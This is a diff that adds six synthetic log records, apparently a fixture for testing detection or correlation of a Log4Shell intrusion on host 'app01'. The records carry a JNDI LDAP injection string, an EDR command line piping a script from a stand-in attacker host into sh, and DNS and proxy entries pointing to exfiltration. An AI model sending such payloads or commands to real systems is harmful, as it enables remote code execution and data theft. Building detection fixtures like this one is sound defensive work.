@@ -1,0 +1,6 @@
+{"log_type":"waf","time":"2024-03-15 10:00:00","src_ip":"8.8.8.8","host":"app01","method":"GET","uri":"/search?q=${jndi:ldap://evil.example/a}","action":"block","rule_id":"WEB-LOG4SHELL-001","attack_type":"Log4Shell","status":"403","user_agent":"curl/8"}
+{"log_type":"application","time":"2024-03-15 10:00:03","src_ip":"8.8.8.8","host":"app01","message":"ERROR request failed ${jndi:ldap://evil.example/a} Runtime.getRuntime exec","trace_id":"trace-001"}
+{"log_type":"edr","time":"2024-03-15 10:02:00","host":"app01","severity":"high","alert":"webshell beacon","process":"java.exe","commandline":"curl http://evil.example/a.sh | sh"}
+{"log_type":"dns","time":"2024-03-15 10:03:00","client_ip":"10.0.0.10","host":"app01","query":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example","rcode":"NOERROR"}
+{"log_type":"proxy","time":"2024-03-15 10:04:00","src_ip":"10.0.0.10","host":"app01","url":"http://evil.example/a.sh","category":"malware","bytes_out":"209715200","action":"allow"}
+{"log_type":"firewall","time":"2024-03-15 10:05:00","src_ip":"10.0.0.10","dst_ip":"5.5.5.5","dst_port":"443","bytes_out":"209715200","action":"allow","protocol":"tcp"}
